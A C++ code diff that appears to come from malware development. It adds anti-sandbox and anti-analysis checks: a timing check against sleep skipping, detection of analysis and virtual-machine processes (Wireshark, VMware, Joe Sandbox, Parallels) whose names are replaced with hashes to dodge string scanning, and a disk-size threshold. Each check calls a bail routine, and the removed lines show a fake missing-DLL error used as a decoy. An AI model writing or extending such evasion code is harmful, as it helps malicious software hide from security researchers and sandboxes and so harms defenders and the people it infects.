@@ -1,4 +1,5 @@
 #include <chrono>
+#include <fileapi.h>
 
 void antiSleep()
 {
@@ -13,26 +14,40 @@ void antiSleep()
     if (elapsed < 5000)
     {
         // recursion_bomb(100000);
-		MessageBoxA(NULL, "MISSING VCREDIST.DLL", "ERROR", MB_ICONWARNING | MB_OK);
-		exit(1);
+		bail();
     }
 }
 
 void auditProcesses()
 {
-	LPCWCHAR susProcs[] = { L"joeboxserver.exe", L"Wireshark.exe",  L"vmware.exe", L"vmsrvc.exe", L"prl_cc.exe"};
+	//LPCWCHAR susProcs[] = { L"joeboxserver.exe", L"Wireshark.exe",  L"vmware.exe", L"vmsrvc.exe", L"prl_cc.exe"};
+	size_t susProcHashes[] = {4117792738986545659, 17088474225186969531, 127634907165549051, 127634907165549051, 124842525090963963};
 
 
-	for (int i = 0; i < sizeof(susProcs)/sizeof(LPCWCHAR); i++)
+	for (int i = 0; i < sizeof(susProcHashes)/sizeof(size_t); i++)
 	{
-		wprintf(L"%s\n", susProcs[i]);
-		if (getPidByName(susProcs[i]) != -1)
+		// wprintf(L"%s\n", susProcs[i]);
+		if (getPidByHash(susProcHashes[i]) != -1)
 		{
 			// recursion_bomb(10000000);
-			MessageBoxA(NULL, "MISSING VCREDIST.DLL", "ERROR", MB_ICONWARNING | MB_OK);
-			exit(1);
+			bail();
 		}
 	}
+}
+
+void auditDrives()
+{
+    unsigned long long threshholdGb = 65;
+    unsigned long long totalBytes = 0;
+
+    GetDiskFreeSpaceExA(/*letter.c_str()*/NULL, NULL, (ULARGE_INTEGER*) & totalBytes, NULL);
+    printf("Total bytes: %llu\n", totalBytes);
+    printf("In gbs: %f\n", totalBytes / (float) 1000000000);
+    if (totalBytes <= threshholdGb * 1000000000)
+    {
+        bail();
+    }
+    return;
 }
 
 void antiSandbox() 
